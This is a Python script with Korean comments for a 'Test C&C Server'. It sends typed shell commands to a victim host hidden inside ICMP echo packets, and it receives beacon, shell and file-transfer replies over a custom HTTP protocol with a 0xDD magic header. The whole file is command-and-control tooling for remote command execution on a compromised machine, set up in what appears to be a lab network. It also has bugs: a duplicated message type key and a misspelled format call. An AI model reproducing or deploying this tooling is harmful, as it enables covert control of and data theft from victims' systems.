#!/usr/bin/env python3
# pip install scapy

from http.server import BaseHTTPRequestHandler, HTTPServer
from struct import unpack, pack
from scapy.all import *

import threading
import sys

# 커스텀 프로토콜의 타입을 정의해둔 클래스
class TypeTable:
    TYPE_LIST = {
        'ERROR' :  b'\x00',          
        'BEACON_REQUEST' : b'\x01',     
        'BEACON_REQUEST' : b'\x02',    
        'SHELL_REQUEST' : b'\x03',     
        'SHELL_RESPONSE' : b'\x04',    
        'FTP_REQUEST' : b'\x05',        
        'FTP_RESPONSE' : b'\x06'        
    }


class CustomProtocol(TypeTable):
    Header = b'\xDD'
    type = b''
    length = b''
    sequence = b''
    data = b""

    # 헤더 값 구성
    def __init__(self, type : str, seq : int, data : bytes) -> None:
        self.type = self.TYPE_LIST[type]
        self.length = len(data).to_bytes(2, byteorder="little")
        self.sequence = seq.to_bytes(4, byteorder="little")
        self.data = data

    # 헤더 값들을 byte 타입으로 리턴
    def __bytes__(self) -> bytes:
        return self.Header + self.type + self.length + self.sequence + self.data


class HTTPHandler(TypeTable, BaseHTTPRequestHandler):

    def _get_type(self, type_num):
        for k, v in self.TYPE_LIST.items():
            if v == type_num.to_bytes(1, byteorder="little"):
                return k

    def _raw_data_parsing(self, raw_data):
        result = {}
        result['header'] = hex(raw_data[0])
        result['type'] = self._get_type(raw_data[1])
        result['length'] = unpack('<L', raw_data[2:4].ljust(4, b'\x00'))[0]
        result['sequence'] = unpack('<L', raw_data[4:8])[0]
        result['data'] = raw_data[8:9+result['length']]
        
        return result

    # POST 요청 시 data를 커스텀 프로토콜에 맞춰 파싱
    def do_POST(self):
        data_string = self.rfile.read(int(self.headers['Content-Length']))

        try:
            if len(data_string) < 8:
                raise Exception("Protocol Header Error")
            parsed_data = self._raw_data_parsing(data_string)

            if parsed_data['header'] != '0xdd':
                raise Exception("Magic Header Error / {} != 0xdd".format(parsed_data['header']))

            print(parsed_data)

            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write('<h1>Test WebSite</h1>'.encode('utf-8'))

        except Exception as e:
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write('Invalid Header\nError Message : {}'.foramt(str(e)).encode('utf-8'))

# 서버 주소와 포트, 피해자 ip 정보
SERVER_INFO = ('192.168.20.4', 2022)
VICTIM_INFO = ('192.168.20.19')

menu_message = '''==Test C&C Server==
Enter the command sending to the victim'''

print(menu_message)

# icmp 메시지를 전송
def send_icmp(data):
    packet = (IP(dst=VICTIM_INFO)/ICMP(type=8)/data)
    send(packet)

# HTTP Server open
try:
    httpd = HTTPServer(SERVER_INFO, HTTPHandler)

    http_server_thread = threading.Thread(target=httpd.serve_forever)
    http_server_thread.start()
except Exception as e:
    print('HTTP Server Open Error / {}'.format(str(e)))
    exit(0)

# 사용자가 입력한 명령어를 icmp 프로토콜로 피해자에게 전송
while True:
    print('> ', end='')
    command = sys.stdin.readline().strip('\n')

    send_icmp(bytes(CustomProtocol('SHELL_REQUEST', 0, bytes(command, 'utf-8'))))
    